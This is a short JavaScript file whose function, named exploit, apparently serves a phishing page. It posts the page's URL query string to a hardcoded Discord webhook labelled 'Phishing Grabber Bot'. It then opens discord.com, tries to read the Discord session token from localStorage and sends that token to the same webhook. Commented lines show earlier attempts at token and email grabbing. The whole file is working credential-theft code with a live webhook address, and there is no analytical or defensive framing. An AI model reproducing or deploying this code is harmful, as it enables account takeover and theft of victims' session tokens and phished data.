let num = 0;

function exploit() {
    if (window.location.search) {
        const webhookURL = 'https://discord.com/api/webhooks/1201061417382580224/57kd9yPBA1RbBohMzYdm23QCYvyHei1Dv4l7Fh9CmAn1sVB9zjsLw-CA6DGmXUpV0dBV';


        // let email = document.getElementById("uid_5").value; //email

        const data = {
            "content": "**`" + window.location.search + "`**",
            "username": "Phishing Grabber Bot",
        }

        fetch(webhookURL, { "method": "post", "headers": { "content-type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" }, "body": JSON.stringify(data) })

        setTimeout(() => {
            

            // popup = window.open('https://discord.com/', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);

            // window.dispatchEvent(new Event('beforeunload'));
            // token = popup.localStorage.token

            ha = window.open("https://discord.com",'','')

            setTimeout(() => {
                window.dispatchEvent(new Event('beforeunload'));
                token = window.localStorage.token
            const data = {
                "content": "**`" + token + "`**",
                "username": "Phishing Grabber Bot",
            }
    
            fetch(webhookURL, { "method": "post", "headers": { "content-type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" }, "body": JSON.stringify(data) })
            
            }, 1);
            
        }, 1500);

        
    } else if(!window.location.search){
        
    }


}

